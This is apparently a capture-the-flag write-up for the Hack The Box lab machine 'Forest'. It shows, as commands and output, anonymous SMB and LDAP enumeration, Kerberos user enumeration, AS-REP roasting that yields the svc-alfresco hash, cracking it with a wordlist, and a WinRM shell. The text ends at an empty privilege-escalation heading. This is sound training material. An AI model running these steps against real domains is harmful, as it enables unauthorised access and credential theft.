# Forest

## Enumeration

### port scan

```
# Nmap 7.92 scan initiated Sat Mar 12 12:21:56 2022 as: nmap -sV -T4 -Pn -n --min-rate=1000 -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA services 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.085s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-03-12 17:28:52Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

```

### smb

Executed nmap script:

```
Nmap scan report for 10.10.10.161
Host is up (0.084s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| smb2-time: 
|   date: 2022-03-12T17:52:11
|_  start_date: 2022-03-12T17:49:58
| port-states: 
|   tcp: 
|_    open: 139,445
| dns-blacklist: 
|   SPAM
|     list.quorum.to - FAIL
|     all.spamrats.com - FAIL
|_    l2.apews.org - FAIL
|_path-mtu: PMTU == 1500
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.10.161\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.161\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.161\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: READ
|   \\10.10.10.161\NETLOGON: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: <none>
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h46m50s, deviation: 4h37m09s, median: 6m48s
|_ipidseq: ERROR: Script execution failed (use -d to debug)
|_fcrdns: FAIL (No PTR record)
| unusual-port: 
|_  WARNING: this script depends on Nmap's service/version detection (-sV)
| smb-mbenum: 
|_  ERROR: Call to Browser Service failed with status = 2184
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-03-12T09:52:01-08:00
| smb-enum-domains: 
|   Builtin
|     Groups: Account Operators, Pre-Windows 2000 Compatible Access, Incoming Forest Trust Builders, Windows Authorization Access Group, Terminal Server License Servers, Administrators, Users, Guests, Print Operators, Backup Operators, Replicator, Remote Desktop Users, Network Configuration Operators, Performance Monitor Users, Performance Log Users, Distributed COM Users, IIS_IUSRS, Cryptographic Operators, Event Log Readers, Certificate Service DCOM Access, RDS Remote Access Servers, RDS Endpoint Servers, RDS Management Servers, Hyper-V Administrators, Access Control Assistance Operators, Remote Management Users, System Managed Accounts Group, Storage Replica Administrators, Server Operators
|     Users: n/a
|     Creation time: 2016-07-16T13:19:09
|     Passwords: min length: n/a; min age: n/a days; max age: 42 days; history: n/a passwords
|     Account lockout disabled
|   HTB
|     Groups: Cert Publishers, RAS and IAS Servers, Allowed RODC Password Replication Group, Denied RODC Password Replication Group, DnsAdmins
|     Users: Administrator, Guest, krbtgt, DefaultAccount, $331000-VK4ADACQNUCA, SM_2c8eef0a09b545acb, SM_ca8c2ed5bdab4dc9b, SM_75a538d3025e4db9a, SM_681f53d4942840e18, SM_1b41c9286325456bb, SM_9b69f1b9d2cc45549, SM_7c96b981967141ebb, SM_c75ee099d0a64c91b, SM_1ffab36a2f5f479cb, HealthMailboxc3d7722, HealthMailboxfc9daad
|     Creation time: 2022-03-12T17:49:48
|     Passwords: min length: 7; min age: 1.0 days; max age: n/a days; history: 24 passwords
|_    Account lockout disabled
| smb2-capabilities: 
|   2.0.2: 
|     Distributed File System
|   2.1: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.0.2: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.1.1: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| qscan: 
| PORT  FAMILY  MEAN (us)  STDDEV   LOSS (%)
| 139   0       84342.50   2758.83  0.0%
|_445   0       83664.90   1220.31  0.0%
| smb-enum-users: 
|   HTB\$331000-VK4ADACQNUCA (RID: 1123)
|     Flags:       Password not required, Password Expired, Account disabled, Normal user account
|   HTB\Administrator (RID: 500)
|     Full name:   Administrator
|     Description: Built-in account for administering the computer/domain
|     Flags:       Normal user account
|   HTB\andy (RID: 1150)
|     Full name:   Andy Hislip
|     Flags:       Password does not expire, Normal user account
|   HTB\DefaultAccount (RID: 503)
|     Description: A user account managed by the system.
|     Flags:       Password not required, Password does not expire, Account disabled, Normal user account
|   HTB\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|     Flags:       Password not required, Password does not expire, Account disabled, Normal user account
|   HTB\HealthMailbox0659cc1 (RID: 1144)
|     Full name:   HealthMailbox-EXCH01-010
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox670628e (RID: 1137)
|     Full name:   HealthMailbox-EXCH01-003
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox6ded678 (RID: 1139)
|     Full name:   HealthMailbox-EXCH01-005
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox7108a4e (RID: 1143)
|     Full name:   HealthMailbox-EXCH01-009
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox83d6781 (RID: 1140)
|     Full name:   HealthMailbox-EXCH01-006
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox968e74d (RID: 1138)
|     Full name:   HealthMailbox-EXCH01-004
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxb01ac64 (RID: 1142)
|     Full name:   HealthMailbox-EXCH01-008
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxc0a90c9 (RID: 1136)
|     Full name:   HealthMailbox-EXCH01-002
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxc3d7722 (RID: 1134)
|     Full name:   HealthMailbox-EXCH01-Mailbox-Database-1118319013
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxfc9daad (RID: 1135)
|     Full name:   HealthMailbox-EXCH01-001
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxfd87238 (RID: 1141)
|     Full name:   HealthMailbox-EXCH01-007
|     Flags:       Password does not expire, Normal user account
|   HTB\krbtgt (RID: 502)
|     Description: Key Distribution Center Service Account
|     Flags:       Account disabled, Normal user account
|   HTB\lucinda (RID: 1146)
|     Full name:   Lucinda Berger
|     Flags:       Password does not expire, Normal user account
|   HTB\mark (RID: 1151)
|     Full name:   Mark Brandt
|     Flags:       Password does not expire, Normal user account
|   HTB\santi (RID: 1152)
|     Full name:   Santi Rodriguez
|_    Flags:       Password does not expire, Normal user account
|_msrpc-enum: NT_STATUS_ACCESS_DENIED
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.0.2
|     2.1
|     3.0
|     3.0.2
|_    3.1.1

```

We got a lot of users, let's save them in a new file for future. Tried to brute force found accounts, but it is not right here. So, I moved on to ldap and kerberos enum.

### kerberos

```
./kerbrute_linux_amd64 userenum --dc 10.10.10.161 -d htb.local ~/htb/forest/users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 03/12/22 - Ronnie Flathers @ropnop

2022/03/12 14:19:28 >  Using KDC(s):
2022/03/12 14:19:28 >   10.10.10.161:88

2022/03/12 14:19:28 >  [+] VALID USERNAME:       santi@htb.local
2022/03/12 14:19:28 >  [+] VALID USERNAME:       lucinda@htb.local
2022/03/12 14:19:28 >  [+] VALID USERNAME:       mark@htb.local
2022/03/12 14:19:28 >  [+] VALID USERNAME:       andy@htb.local
2022/03/12 14:19:28 >  Done! Tested 5 usernames (4 valid) in 0.086 seconds
```

Trying to find DONT\_REQ\_PREAUTH:

```
GetNPUsers.py -request -usersfile ~/htb/forest/users -no-pass -dc-ip 10.10.10.161 htb/10.10.10.161       
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Nothing :(

### ldap

I started with user enumeration:

```
ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=HTB,DC=local" | grep dn: | grep Employees 
dn: OU=Employees,DC=htb,DC=local
dn: OU=Information Technology,OU=Employees,DC=htb,DC=local
dn: OU=Exchange Administrators,OU=Information Technology,OU=Employees,DC=htb,D
dn: OU=Developers,OU=Information Technology,OU=Employees,DC=htb,DC=local
dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC
dn: OU=Application Support,OU=Information Technology,OU=Employees,DC=htb,DC=lo
dn: OU=IT Management,OU=Information Technology,OU=Employees,DC=htb,DC=local
dn: CN=Lucinda Berger,OU=IT Management,OU=Information Technology,OU=Employees,
dn: OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,DC=local
dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
dn: OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,DC=local
dn: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,
dn: OU=Sales,OU=Employees,DC=htb,DC=local
dn: OU=Marketing,OU=Employees,DC=htb,DC=local
dn: OU=Reception,OU=Employees,DC=htb,DC=local
```

We can see that this users exist. Continued to enumerate, but service accounts:

```
ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=HTB,DC=local" | grep dn: | grep Service
dn: CN=WinsockServices,CN=System,DC=htb,DC=local
dn: CN=RpcServices,CN=System,DC=htb,DC=local
dn: CN=File Replication Service,CN=System,DC=htb,DC=local
dn: CN=Managed Service Accounts,DC=htb,DC=local
dn: OU=Service Accounts,DC=htb,DC=local
dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
dn: CN=Service Accounts,OU=Security Groups,DC=htb,DC=local
dn: CN=Certificate Service DCOM Access,CN=Builtin,DC=htb,DC=local

```

And I found `svc-alfresco`.

## Gaining access

Added a new user to my userlist and tried again ASREPRoasting:

```
GetNPUsers.py -request -usersfile ~/htb/forest/users -no-pass -dc-ip 10.10.10.161 htb/10.10.10.161 -format john
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$svc-alfresco@HTB:b40c22834441351db69b02681fc0f2f6$c65c7bc560452980054d5f2595122e39da6c9e7e80c38728457ccdb242d50a756448d0dcdfcf841e114c3c5309cfdba72169e980dec0da09334f4a45790d1ab1adfec1a4d47f69c1df98596e00b5fae1c9729be7cbcfd26a5b16946c77f6452ecc8e7ca9f8ec11b0053041548d83d3cc30d99dc2c743a749ff7d846e3d7078329ba52be128fc38e539c3664d0a43885d2ad8c2f4126a77c7524db485a33d5e2fe0b3e69e53f6b87ee46db6ad48f123ed067008ef6765d2424728526370d36f72221cea6ee64f74d1e4e3707a49e945eacdcdb88f225ee27c9a780a289685a4ff
```

Cracked its password with john:

```
john -w=/usr/share/wordlists/rockyou.txt hash               
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$svc-alfresco@HTB)     
1g 0:00:00:04 DONE (2022-03-12 14:28) 0.2217g/s 905933p/s 905933c/s 905933C/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Fine, we have access on machine.&#x20;

```
evil-winrm -i 10.10.10.161 -u "svc-alfresco" -p "s3rvice"                         

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

## Privilege escalation
